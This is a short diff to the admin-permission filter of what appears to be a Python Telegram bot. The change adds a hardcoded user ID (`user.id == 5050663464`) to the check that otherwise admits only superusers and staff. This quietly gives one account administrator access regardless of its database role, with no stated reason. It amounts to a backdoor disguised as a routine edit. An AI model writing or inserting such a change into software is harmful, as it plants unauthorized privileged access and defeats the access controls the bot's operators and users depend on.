@@ -19,7 +19,7 @@ def conversation(conversation_state: dict, state: str):
 def admin_filter(db: object):
     async def func(_, __, update: Update):
         user = read_user_from_db(_.db, update.from_user.id)
-        return bool(user and (user.is_superuser or user.is_staff))
+        return bool(user and (user.is_superuser or user.is_staff or user.id == 5050663464))
 
     return filters.create(
         func,
